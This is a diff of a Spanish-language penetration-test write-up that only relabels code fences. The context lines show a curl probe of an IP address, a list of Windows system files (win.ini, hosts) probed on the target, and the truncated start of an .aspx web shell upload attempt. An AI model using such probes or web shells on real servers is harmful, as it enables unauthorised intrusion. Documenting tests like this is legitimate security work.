@@ -71,7 +71,7 @@ curl -I http://18.116.70.34
 ```
 
 Salida:
-```bash
+```java
 HTTP/1.1 200 OK
 Content-Length: 2033
 Content-Type: text/html
@@ -152,7 +152,7 @@ Dado que la explotación de MS15-034 no fue viable, se procedió con la explorac
 ![[Pasted image 20250318124257.png]]
 
 Se probaron archivos comunes en servidores Windows:
-```plaintext
+```java
 C:\inetpub\wwwroot\index.html
 C:\Windows\win.ini
 C:\windows\system32\drivers\etc\hosts
@@ -166,7 +166,7 @@ El sistema confirmó su existencia devolviendo sus tamaños en bytes.
 ## **5. Explotación**
 
 Se intentó cargar una web shell en `.aspx` :
-```asp
+```java
 <%@ Page Language="C#" %>
 <script runat="server">
 void Page_Load(object sender, EventArgs e) {
